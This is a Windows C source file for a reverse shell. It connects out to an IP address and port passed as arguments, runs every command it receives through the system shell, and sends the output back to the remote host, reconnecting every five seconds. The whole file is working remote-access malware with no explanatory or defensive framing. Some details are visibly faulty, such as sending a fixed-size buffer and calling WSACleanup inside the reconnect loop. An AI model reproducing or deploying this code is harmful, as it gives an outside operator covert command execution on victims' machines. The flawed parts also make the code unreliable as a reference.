#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <process.h>
#include <ws2tcpip.h>

#define MAX_LENGTH 1024

void shell(SOCKET s) {
    char data[MAX_LENGTH];
    int data_len;
    while(1) {
        memset(data, 0, sizeof(data));
        data_len = recv(s, data, MAX_LENGTH, 0);
        if (data_len <= 0) {
            break;
        }
        if (strcmp(data, "exit\n") == 0) {
            break;
        } else {
            FILE *fp;
            char path[1035];
            fp = _popen(data, "r");
            if (fp == NULL) {
                printf("Failed to run command\n" );
                exit(1);
            }
            while (fgets(path, sizeof(path), fp) != NULL) {
                send(s, path, sizeof(path), 0);
            }
            _pclose(fp);
        }
    }
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <ip> <port>\n", argv[0]);
        exit(1);
    }

    char* server = argv[1];
    int port = atoi(argv[2]);
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server_addr;

    WSAStartup(MAKEWORD(2,2), &wsa);
    while(1) {
        s = socket(AF_INET , SOCK_STREAM , 0);
        server_addr.sin_addr.s_addr = inet_addr(server);
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);

        if (connect(s, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            printf("Connect error\n");
            exit(1);
        } else {
            shell(s);
            closesocket(s);
            WSACleanup();
        }
        Sleep(5000);
    }

    return 0;
}
